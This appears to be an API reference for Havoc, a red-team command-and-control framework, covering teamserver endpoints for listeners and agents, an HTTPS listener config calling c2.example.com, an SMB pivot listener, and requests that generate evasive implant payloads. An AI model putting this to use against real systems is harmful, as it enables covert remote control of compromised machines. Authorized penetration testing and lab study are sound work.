# API Reference: Red Team C2 Infrastructure with Havoc

> For authorized penetration testing and lab environments only.

## Havoc Teamserver API
```
Base URL: https://{teamserver}:{port}/api/
Authorization: Bearer {token}
```

## Listener Endpoints
| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/listeners` | List active listeners |
| POST | `/api/listeners` | Create new listener |
| DELETE | `/api/listeners/{name}` | Remove listener |

## Agent (Demon) Endpoints
| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/agents` | List connected agents |
| POST | `/api/agents/{id}/command` | Task agent |
| GET | `/api/agents/{id}/output` | Get task output |

## HTTPS Listener Config
```json
{
  "name": "https-c2",
  "protocol": "Https",
  "host": "0.0.0.0",
  "port": 443,
  "hosts": ["c2.example.com"],
  "secure": true,
  "user_agent": "Mozilla/5.0 ..."
}
```

## SMB Listener Config
```json
{
  "name": "smb-pivot",
  "protocol": "Smb",
  "pipe_name": "\\\\.\\pipe\\mojo_ipc"
}
```

## Payload Generation
```json
POST /api/payloads/generate
{
  "listener": "https-c2",
  "arch": "x64",
  "format": "exe",
  "config": {
    "sleep": 5,
    "jitter": 20,
    "indirect_syscalls": true,
    "sleep_technique": "WaitForSingleObjectEx"
  }
}
```

## Payload Formats
| Format | Description |
|--------|-------------|
| `exe` | Windows PE executable |
| `dll` | DLL side-loading |
| `shellcode` | Raw shellcode |
| `service_exe` | Windows service binary |

## Agent Properties
| Field | Description |
|-------|-------------|
| `agent_id` | Unique identifier |
| `hostname` | Target hostname |
| `username` | Running user context |
| `os` | Operating system |
| `process_name` | Host process |
| `pid` | Process ID |
| `sleep` | Callback interval (seconds) |
| `last_callback` | Last check-in time |
